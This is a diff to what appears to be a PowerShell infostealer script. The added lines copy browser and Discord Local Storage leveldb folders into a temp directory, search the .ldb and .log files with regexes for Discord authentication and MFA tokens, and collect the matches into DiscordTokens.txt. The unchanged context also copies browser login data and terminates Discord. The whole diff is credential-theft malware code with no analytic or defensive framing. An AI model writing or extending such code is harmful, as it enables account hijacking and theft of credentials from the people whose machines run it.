@@ -604,10 +604,30 @@ $localstate = "$path\User Data\Local State"
 $logindata = "$path\User Data\default\Login Data"
 $preferences = "$path\User Data\default\Preferences"
 $localstorage = "$path\User Data\default\Local Storage\leveldb"
+Copy-Item $localstorage "$env:TMP\$FolderName\$Browser\Local Storage\leveldb" -Recurse
+$leveldb = "$env:TMP\$FolderName\$Browser\Local Storage\leveldb"
+$ldb = Get-ChildItem $leveldb\*.ldb
+foreach ($file in $ldb) {
+	$file=$file.Name
+	$f="$leveldb\$file"
+	$tokens = Get-Content $f | Select-String "[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
+	echo $tokens >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
+	$tokens2 = Get-Content $f | Select-String "mfa\.[\w-]{84}"
+	echo $tokens2 >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
+}
+$log = Get-ChildItem $leveldb\*.log
+foreach ($file in $log) {
+	$file=$file.Name
+	$f="$leveldb\$file"
+	$tokens = Get-Content $f | Select-String "[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
+	echo $tokens >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
+	$tokens2 = Get-Content $f | Select-String "mfa\.[\w-]{84}"
+	echo $tokens2 >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
+}
 Copy-Item $localstate "$env:TMP\$FolderName\$Browser\Local State"
 Copy-Item $localdata "$env:TMP\$FolderName\$Browser\Local Data"
 Copy-Item $preferences "$env:TMP\$FolderName\$Browser\Preferences"
-Copy-Item $localstorage "$env:TMP\$FolderName\$Browser\Local Storage\leveldb" -Recurse
+
 }
 
 # Get FireFox Passwords
@@ -653,11 +673,31 @@ New-Item -Path $env:tmp/$FolderName/$Browser -ItemType Directory
 $localstate = "$path\Local State"
 $logindata = "$path\Login Data"
 $preferences = "$path\Preferences"
-$leveldb = "$path\Local Storage\leveldb\"
+$leveldb = "$path\Local Storage\leveldb"
+Copy-Item $leveldb "$env:TMP\$FolderName\$Browser\Local Storage\leveldb" -Recurse
+$lvdb = "$env:TMP\$FolderName\$Browser\Local Storage\leveldb"
+$ldb = Get-ChildItem $lvdb\*.ldb
+foreach ($file in $ldb) {
+	$file=$file.Name
+	$f="$lvdb\$file"
+	$tokens = Get-Content $f | Select-String "[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
+	echo $tokens >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
+	$tokens2 = Get-Content $f | Select-String "mfa\.[\w-]{84}"
+	echo $tokens2 >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
+}
+$log = Get-ChildItem $lvdb\*.log
+foreach ($file in $log) {
+	$file=$file.Name
+	$f="$lvdb\$file"
+	$tokens = Get-Content $f | Select-String "[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
+	echo $tokens >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
+	$tokens2 = Get-Content $f | Select-String "mfa\.[\w-]{84}"
+	echo $tokens2 >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
+}
 Copy-Item $localstate "$env:TMP\$FolderName\$Browser\Local State"
 Copy-Item $localdata "$env:TMP\$FolderName\$Browser\Local Data"
 Copy-Item $preferences "$env:TMP\$FolderName\$Browser\Preferences"
-Copy-Item $leveldb "$env:TMP\$FolderName\$Browser\Local Storage\leveldb" -Recurse
+
 }
 
 # Get OperaGX Passwords
@@ -672,10 +712,29 @@ $localstate = "$path\Local State"
 $logindata = "$path\Login Data"
 $preferences = "$path\Preferences"
 $leveldb = "$path\Local Storage\leveldb\"
+Copy-Item $leveldb "$env:TMP\$FolderName\$Browser\Local Storage\leveldb" -Recurse
+$lvdb = "$env:TMP\$FolderName\$Browser\Local Storage\leveldb"
+$ldb = Get-ChildItem $lvdb\*.ldb
+foreach ($file in $ldb) {
+	$file=$file.Name
+	$f="$lvdb\$file"
+	$tokens = Get-Content $f | Select-String "[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
+	echo $tokens >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
+	$tokens2 = Get-Content $f | Select-String "mfa\.[\w-]{84}"
+	echo $tokens2 >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
+}
+$log = Get-ChildItem $lvdb\*.log
+foreach ($file in $log) {
+	$file=$file.Name
+	$f="$lvdb\$file"
+	$tokens = Get-Content $f | Select-String "[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
+	echo $tokens >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
+	$tokens2 = Get-Content $f | Select-String "mfa\.[\w-]{84}"
+	echo $tokens2 >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
+}
 Copy-Item $localstate "$env:TMP\$FolderName\$Browser\Local State"
 Copy-Item $localdata "$env:TMP\$FolderName\$Browser\Local Data"
 Copy-Item $preferences "$env:TMP\$FolderName\$Browser\Preferences"
-Copy-Item $leveldb "$env:TMP\$FolderName\$Browser\Local Storage\leveldb" -Recurse
 }
 
 # Get Yandex Passwords
@@ -698,13 +757,31 @@ function discordStorage {
 
 New-Item -Path $env:tmp/$FolderName/$Browser -ItemType Directory
 $localstate = "$path\Local State"
-$localstorage = "$path\Local Storage\leveldb\"
-Copy-Item $localstate "$env:TMP\$FolderName\$Browser\Local State"
+$localstorage = "$path\Local Storage\leveldb"
 Copy-Item -path $localstorage -Destination "$env:TMP\$FolderName\$Browser\Local Storage\leveldb" -Recurse
+$lvdb = "$env:TMP\$FolderName\$Browser\Local Storage\leveldb"
+$ldb = Get-ChildItem $lvdb\*.ldb
+foreach ($file in $ldb) {
+	$file=$file.Name
+	$f="$lvdb\$file"
+	$tokens = Get-Content $f | Select-String "[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
+	echo $tokens >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
+	$tokens2 = Get-Content $f | Select-String "mfa\.[\w-]{84}"
+	echo $tokens2 >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
+}
+$log = Get-ChildItem $lvdb\*.log
+foreach ($file in $log) {
+	$file=$file.Name
+	$f="$lvdb\$file"
+	$tokens = Get-Content $f | Select-String "[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
+	echo $tokens >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
+	$tokens2 = Get-Content $f | Select-String "mfa\.[\w-]{84}"
+	echo $tokens2 >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
+}
+Copy-Item $localstate "$env:TMP\$FolderName\$Browser\Local State"
 }
 
 # Discord Token Grabbing
-
 
 if([System.IO.File]::Exists("$env:appdata\discord\mute.png")){
 taskkill /IM Discord.exe /F
